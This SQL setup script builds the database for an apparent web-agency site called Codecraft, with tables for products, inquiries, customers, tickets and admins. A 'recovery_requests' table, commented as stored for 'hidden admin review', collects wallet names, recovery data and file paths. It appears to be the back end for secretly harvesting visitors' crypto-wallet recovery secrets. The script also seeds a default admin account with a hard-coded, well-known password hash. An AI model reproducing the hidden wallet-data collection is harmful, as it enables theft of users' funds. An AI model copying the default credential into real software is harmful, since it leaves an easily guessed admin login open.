-- Codecraft MySQL Database Setup
-- Run this script in your MySQL database

CREATE DATABASE IF NOT EXISTS codecraft;
USE codecraft;

-- Partners table
CREATE TABLE IF NOT EXISTS partners (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    logo VARCHAR(500),
    website VARCHAR(500),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Products table
CREATE TABLE IF NOT EXISTS products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    price DECIMAL(10,2),
    image VARCHAR(500),
    category VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Inquiries table (contact form submissions)
CREATE TABLE IF NOT EXISTS inquiries (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    email VARCHAR(255) NOT NULL,
    phone VARCHAR(50),
    service VARCHAR(255),
    message TEXT,
    status ENUM('new', 'contacted', 'resolved') DEFAULT 'new',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Customers table
CREATE TABLE IF NOT EXISTS customers (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    email VARCHAR(255) UNIQUE,
    phone VARCHAR(50),
    company VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Tickets table (support tickets)
CREATE TABLE IF NOT EXISTS tickets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    customer_id INT,
    subject VARCHAR(255) NOT NULL,
    description TEXT,
    status ENUM('open', 'in_progress', 'closed') DEFAULT 'open',
    priority ENUM('low', 'medium', 'high') DEFAULT 'medium',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (customer_id) REFERENCES customers(id) ON DELETE SET NULL
);

-- Ideas table (feature ideas)
CREATE TABLE IF NOT EXISTS ideas (
    id INT AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(255) NOT NULL,
    description TEXT,
    status ENUM('pending', 'approved', 'implemented') DEFAULT 'pending',
    votes INT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Admin table
CREATE TABLE IF NOT EXISTS admins (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Recovery requests table (stored for hidden admin review)
CREATE TABLE IF NOT EXISTS recovery_requests (
    id INT AUTO_INCREMENT PRIMARY KEY,
    recovery_type VARCHAR(100) NOT NULL,
    wallet_name VARCHAR(255) NOT NULL,
    recovery_data TEXT NOT NULL,
    file_path VARCHAR(500),
    expires_at DATETIME NOT NULL,
    status ENUM('pending','reviewed') DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Insert default admin (password: admin123 - change in production!)
INSERT INTO admins (username, password, email) VALUES 
('admin', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'admin@codecraft.com')
ON DUPLICATE KEY UPDATE username=username;

-- Insert sample partners
INSERT INTO partners (name, logo, website) VALUES 
('TechCorp', 'https://via.placeholder.com/150x50?text=TechCorp', 'https://techcorp.example.com'),
('InnovateLabs', 'https://via.placeholder.com/150x50?text=InnovateLabs', 'https://innovatelabs.example.com'),
('DevSolutions', 'https://via.placeholder.com/150x50?text=DevSolutions', 'https://devsolutions.example.com'),
('CloudBase', 'https://via.placeholder.com/150x50?text=CloudBase', 'https://cloudbase.example.com')
ON DUPLICATE KEY UPDATE name=name;

-- Insert sample products
INSERT INTO products (name, description, price, image, category) VALUES 
('Web Development Package', 'Complete website development with modern design', 999.99, 'https://via.placeholder.com/300x200?text=Web+Dev', 'Services'),
('Mobile App Development', 'Native and cross-platform mobile applications', 1499.99, 'https://via.placeholder.com/300x200?text=Mobile+App', 'Services'),
('E-commerce Solution', 'Full-featured online store with payment integration', 1999.99, 'https://via.placeholder.com/300x200?text=E-commerce', 'Services'),
('SEO Optimization', 'Improve your search engine rankings', 499.99, 'https://via.placeholder.com/300x200?text=SEO', 'Services')
ON DUPLICATE KEY UPDATE name=name;